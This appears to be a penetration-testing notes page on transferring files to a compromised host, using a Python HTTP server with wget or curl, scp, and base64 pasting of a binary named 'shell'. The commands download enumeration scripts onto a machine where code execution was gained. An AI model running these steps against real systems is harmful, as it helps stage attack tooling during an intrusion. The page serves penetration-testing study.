# <h1 style="text-align:center">Transferring Files</h1>

There is always the possibility that we ill need to transfer files to a remote server (e.g. enumeration scripts or exploits), or transfer data back to our host. 

## ```wget```

One can set up a [Python HTTP Server](https://developer.mozilla.org/en-US/docs/Learn/Common_questions/Tools_and_setup/set_up_a_local_testing_server) and use ```wget``` or ```cURL``` to download the file. 

We do this by first going into the directory that contains the file and then start a HTTP server on our machine:

    python3 -m http.server 8000         // start server on port 8000

With a server listening on our machine, we can download the file on the remote host here we have code execution:

    wget http://10.10.41.1:8000/linenum.sh                  // using wget

    curl http://10.10.41.1:8000/linenum.sh -o linenum.sh    // using cURL

## Using SCP

If we have obtained ssh use we can also use ```scp```.

    scp linenum.sh user@remotehosst:/tmp/linenum.sh

## Using Base64

We may not be able to transfer in a file. We can base64 encode the file into base64 format and then paste the base64 string on the remote server and decode it. If we wanted to transfer a binary file called 'shell', we can base64 encode it as follows:

    base64 shell -w 0               // outputs a code

Paste and decode the code:

    echo <code> | base64 -d > shell

## Validating File Transfers

To validate format of a file we can run the ```file``` command.

To check a checksum we can:

    md5sum shell                    // md5sum hash; check against host


